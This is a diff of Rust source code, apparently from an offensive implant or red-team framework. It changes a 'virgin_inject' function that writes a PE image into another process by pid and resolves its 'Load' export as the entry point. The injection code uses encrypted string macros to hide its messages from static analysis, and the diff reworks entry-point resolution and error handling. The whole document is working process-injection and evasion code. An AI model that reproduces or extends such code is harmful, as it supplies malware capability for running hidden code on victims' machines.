@@ -1,8 +1,9 @@
-use std::{arch::asm, ffi::c_void, mem::transmute, ptr::null_mut};
+use std::{ffi::c_void, mem::transmute, ptr::null_mut};
 
 use shared::tasks::WyrmResult;
 use shared_no_std::export_resolver::{
-    ExportError, calculate_memory_delta, find_export_from_unmapped_file,
+    ExportError, calculate_memory_delta, find_entrypoint_from_unmapped_image,
+    find_export_from_unmapped_file,
 };
 use str_crypter::{decrypt_string, sc};
 use windows_sys::Win32::{
@@ -63,11 +64,25 @@ pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
     //
     // Resolve the entry address
     //
-    let p_entry = match find_entrypoint(&buf, p_alloc) {
+    let p_entry = match find_entrypoint_from_unmapped_image(&buf, p_alloc, "Load") {
         Ok(p) => unsafe { transmute::<_, extern "system" fn(_: *mut core::ffi::c_void) -> u32>(p) },
         Err(e) => {
             unsafe { CloseHandle(h_process) };
-            return WyrmResult::Err(e);
+            let msg = match e {
+                ExportError::ImageTooSmall => sc!("ImageTooSmall", 19).unwrap(),
+                ExportError::ImageUnaligned => sc!("ImageUnaligned", 19).unwrap(),
+                ExportError::ExportNotFound => sc!("ExportNotFound", 19).unwrap(),
+                ExportError::BadImageDelta => sc!("BadImageDelta", 19).unwrap(),
+            };
+
+            #[cfg(debug_assertions)]
+            {
+                use crate::utils::console::print_failed;
+
+                print_failed(&msg);
+            }
+
+            return WyrmResult::Err(msg);
         }
     };
 
@@ -126,43 +141,4 @@ pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
         "{} {pid}",
         sc!("Injected into process", 159).unwrap()
     ))
-}
-
-fn find_entrypoint(buf: &[u8], p_alloc: *const c_void) -> Result<*const c_void, String> {
-    match find_export_from_unmapped_file(buf, "Load") {
-        Ok(p) => {
-            print_info(format!(
-                "fn ptr unmap: {:p}/{}, p_alloc: {:p}/{}",
-                p as *const c_void, p as usize, p_alloc, p_alloc as usize,
-            ));
-            let Some(addr) = calculate_memory_delta(buf.as_ptr() as usize, p as usize) else {
-                return Err(sc!("Could not calculate memory delta.", 204).unwrap());
-            };
-            let addr_calculated = unsafe { p_alloc.add(addr) };
-            Ok(addr_calculated)
-        }
-        Err(e) => {
-            let part = match e {
-                ExportError::ImageTooSmall => sc!("Image too small", 65).unwrap(),
-                ExportError::ImageUnaligned => sc!("Image not aligned", 65).unwrap(),
-                ExportError::ExportNotFound => sc!("Export not found", 65).unwrap(),
-            };
-
-            let msg = format!(
-                "{} {part}",
-                sc!(
-                    "Could not find the Shim address in the PE image to spawn.",
-                    164
-                )
-                .unwrap()
-            );
-            #[cfg(debug_assertions)]
-            {
-                use crate::utils::console::print_failed;
-
-                print_failed(&msg);
-            }
-            return Err(msg);
-        }
-    }
 }
